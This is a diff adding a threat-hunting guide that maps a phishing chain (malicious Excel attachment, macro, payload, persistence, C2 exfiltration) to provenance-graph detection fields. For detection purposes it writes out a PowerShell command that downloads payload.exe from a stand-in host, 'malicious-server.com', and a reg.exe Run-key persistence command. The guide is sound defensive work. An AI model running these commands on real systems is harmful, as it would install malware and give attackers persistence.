@@ -1,0 +1,62 @@
+1. **Identify Initial Access via Email**  
+   - Monitor for the creation of processes related to Microsoft Outlook when an email with the subject line "Important Update" and an attachment named "Invoice_2023.xlsx" is received.  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" (or similar path for Outlook)  
+     - `dstNode.Type`: "File"  
+     - `dstNode.Name`: "Invoice_2023.xlsx"  
+     - `relation`: "Process Create"  
+
+2. **Identify Opening the Malicious Attachment**  
+   - Monitor for the execution of Microsoft Excel when the user opens the attachment "Invoice_2023.xlsx".  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" (or similar path for Excel)  
+     - `dstNode.Type`: "File"  
+     - `dstNode.Name`: "Invoice_2023.xlsx"  
+     - `relation`: "Process Create"  
+
+3. **Identify Macro Execution**  
+   - Monitor for the execution of PowerShell commands triggered by macros within the Excel file. Specifically, look for the command that downloads a payload from a remote server.  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
+     - `srcNode.Cmdline`: `-ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe'"`  
+     - `dstNode.Type`: "File"  
+     - `dstNode.Name`: "payload.exe"  
+     - `relation`: "Process Create"  
+
+4. **Identify Payload Execution**  
+   - Monitor for the execution of the downloaded payload located in the Temp directory.  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe"  
+     - `relation`: "Process Create"  
+
+5. **Identify Establishing Persistence**  
+   - Monitor for registry modifications that create persistence for the payload. Specifically, look for the creation of a registry entry under "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Windows\\System32\\reg.exe"  
+     - `srcNode.Cmdline`: `add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe" /f`  
+     - `dstNode.Type`: "Registry"  
+     - `dstNode.Key`: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  
+     - `relation`: "RegSetValue"  
+
+6. **Identify Data Exfiltration**  
+   - Monitor for network connections initiated by the payload to a command and control (C2) server for data exfiltration.  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe"  
+     - `dstNode.Type`: "Network"  
+     - `dstNode.Dstaddress`: "malicious-server.com"  
+     - `relation`: "TCP Connect"  
+
+7. **Identify Cleanup Actions**  
+   - Monitor for the deletion of the original email or attachment by the user, which may indicate an attempt to cover tracks.  
+   - Schema Fields:  
+     - `srcNode.Type`: "Process"  
+     - `srcNode.Image`: "C:\\Windows\\explorer.exe"  
+     - `dstNode.Type`: "File"  
+     - `dstNode.Name`: "Invoice_2023.xlsx"  
+     - `relation`: "DeleteFile"  
